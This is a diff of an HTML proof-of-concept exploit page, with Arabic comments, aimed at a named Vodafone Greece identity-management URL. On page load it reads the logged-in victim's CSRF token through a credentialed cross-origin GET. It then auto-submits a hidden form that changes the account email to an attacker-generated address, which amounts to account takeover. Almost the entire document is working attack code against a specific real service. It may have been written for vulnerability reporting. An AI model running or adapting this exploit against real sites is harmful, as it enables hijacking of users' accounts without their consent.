@@ -1,22 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Critical Security Demonstration</title>
+    <title>Critical Security PoC</title>
 </head>
 <body>
-    <div id="msg" style="font-family: Arial, sans-serif; padding: 20px;">
-        <h2>System Processing...</h2>
-        <p id="status">Initiating Sequence...</p>
+    <div id="msg" style="font-family: sans-serif; padding: 20px;">
+        <h2>Exploiting...</h2>
+        <p id="status">Step 1: Sniffing Token via CORS (GET)...</p>
     </div>
 
     <script>
         const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";
 
-        async function startPwn() {
+        async function launchAttack() {
             try {
-                // 1. سحب التوكن (الخطوة اللي بتسبق الـ POST)
-                document.getElementById('status').innerText = "Step 1: Extracting CSRF Token...";
+                // 1. سحب التوكن (الـ GET مسموح وما ببعث OPTIONS Preflight)
                 const response = await fetch(target, { method: 'GET', credentials: 'include' });
                 const html = await response.text();
                 const parser = new DOMParser();
@@ -24,90 +22,55 @@
                 const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
 
                 if (!token) {
-                    document.getElementById('status').innerText = "❌ Error: Could not capture token.";
+                    document.getElementById('status').innerText = "❌ Error: Token not captured. Are you logged in?";
                     return;
                 }
 
-                // 2. تنفيذ الـ POST (الضربة القاضية)
-                document.getElementById('status').innerText = "Step 2: Sending POST Payload...";
-                
-                const newEmail = `hacked_${Math.random().toString(36).substring(7)}@test.io`;
-                
-                // بناء الـ Body بنفس الترتيب اللي بالـ Burp
-                const bodyData = new URLSearchParams();
-                bodyData.append('IsEmailConfirmed', 'True');
-                bodyData.append('Email', newEmail);
-                bodyData.append('PhoneNumber', '');
-                bodyData.append('Name', '');
-                bodyData.append('Website', '');
-                bodyData.append('Profile', '');
-                bodyData.append('StreetAddress', '');
-                bodyData.append('Locality', '12');
-                bodyData.append('Region', '');
-                bodyData.append('PostalCode', '');
-                bodyData.append('Country', '');
-                bodyData.append('__RequestVerificationToken', token);
+                document.getElementById('status').innerText = "Step 2: Token Captured! Bypassing OPTIONS via Form Submit...";
 
-                // إرسال الـ POST وتوقع الـ Redirect
-                const postRes = await fetch(target, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        // هاد الهيدر ضروري في بعض نسخ ASP.NET
-                        'RequestVerificationToken': token 
-                    },
-                    body: bodyData,
-                    credentials: 'include',
-                    redirect: 'follow' // عشان يلحق الـ GET اللي بصير بعد الـ POST تلقائياً
-                });
+                // 2. استخدام الفورم يدوياً (لأنه Simple Request ولا يخضع للـ Preflight)
+                const form = document.createElement('form');
+                form.method = "POST";
+                form.action = target;
 
-                if (postRes.ok) {
-                    document.getElementById('status').innerHTML = 
-                        `<h2 style="color:green">✅ PWNED!</h2><p>Email changed to: <b>${newEmail}</b></p>`;
-                } else {
-                    // إذا لسا فيه 400، رح نلجأ للفورم التقليدي لأنه أضمن مع الـ Redirects
-                    document.getElementById('status').innerText = "⚠️ Fetch rejected. Using Form Fallback...";
-                    submitAsForm(token, newEmail);
+                // البيانات المطلوبة لتغيير الإيميل
+                const newEmail = `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`;
+                const payload = {
+                    "IsEmailConfirmed": "True",
+                    "Email": newEmail,
+                    "PhoneNumber": "",
+                    "Name": "Xia0Checkmate",
+                    "Website": "",
+                    "Profile": "",
+                    "StreetAddress": "",
+                    "Locality": "12",
+                    "Region": "",
+                    "PostalCode": "",
+                    "Country": "",
+                    "__RequestVerificationToken": token // التوكن المسروق
+                };
+
+                for (const key in payload) {
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = payload[key];
+                    form.appendChild(input);
                 }
 
+                document.body.appendChild(form);
+                
+                // التنفيذ الفوري
+                setTimeout(() => {
+                    form.submit();
+                }, 1000);
+
             } catch (err) {
-                document.getElementById('status').innerText = "❌ Error: " + err.message;
+                document.getElementById('status').innerText = "❌ Critical Error: " + err.message;
             }
         }
 
-        function submitAsForm(token, email) {
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = target;
-
-            const fields = {
-                'IsEmailConfirmed': 'True',
-                'Email': email,
-                'PhoneNumber': '',
-                'Name': '',
-                'Website': '',
-                'Profile': '',
-                'StreetAddress': '',
-                'Locality': '12',
-                'Region': '',
-                'PostalCode': '',
-                'Country': '',
-                '__RequestVerificationToken': token
-            };
-
-            for (const name in fields) {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = name;
-                input.value = fields[name];
-                form.appendChild(input);
-            }
-
-            document.body.appendChild(form);
-            form.submit(); // هاد رح يعمل الـ POST والـ Redirect (GET) تلقائياً بالمتصفح
-        }
-
-        window.onload = startPwn;
+        window.onload = launchAttack;
     </script>
 </body>
 </html>
